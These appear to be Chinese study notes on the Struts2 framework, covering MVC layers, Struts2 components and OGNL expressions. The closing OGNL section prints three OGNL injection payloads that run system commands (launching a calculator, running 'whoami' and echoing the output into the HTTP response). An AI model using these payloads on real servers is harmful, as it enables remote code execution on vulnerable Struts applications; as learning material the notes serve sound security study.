# STRUT架构

1. MVC架构
    
    <aside>
    💡 业务逻辑（C），数据（M），显示界面（V）分离的模式
    
    </aside>
    
    1. 模型*（Model）*
        - 负责存储系统的中心数据，核心算法，操作数据库
    2. 视图*（View）*
        - 将信息显示给用户
    3. 控制器*（Controller）*
        - 处理用户输入的信息，用户动作转换成模型层的输入，调用模型
2. Strut2架构
    
    <aside>
    💡 Strut2架构是MVC架构的一种实现
    
    </aside>
    
    1. 视图*（View）*
        
        <aside>
        💡 创建一个JSP与用户进行交互
        
        </aside>
        
        - 操作*（Action）*
    2. 控制器*（Controller）*
        - 解包过滤，分配模型*（Dispatcher Filter）*
        - 拦截器*（Interceptor）*
    3. 模型*（Model）*
        - 动作*（Action）*
        - 值栈*（Value Stack）*
            
            <aside>
            💡 OGNL表达式技术栈实现
            
            </aside>
            
        - 结果*（Result）*
    4. 配置文件*（Configuration File）*
        - 连接动作，视图以及控制器
            
            <aside>
            💡 分别是struts.xml，web.xml，struts.properties
            
            </aside>
            
3. OGNL表达式
    - 调用静态方法
        
        ```java
        @package.classname@methodname(parameter)
        ```
        
        - 实例
            
            ```java
            %{@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app")}
            ```
            
            ```java
            %{(new java.lang.ProcessBuilder(new java.lang.String[]{“calc.exe”})).start()}
            ```
            
            ```java
            %{
            #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
            #b=#a.getInputStream(),
            #c=new java.io.InputStreamReader(#b),
            #d=new java.io.BufferedReader(#c),
            #e=new char[50000],
            #d.read(#e),
            #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
            #f.getWriter().println(new java.lang.String(#e)),
            #f.getWriter().flush(),
            #f.getWriter().close()
            }
            ```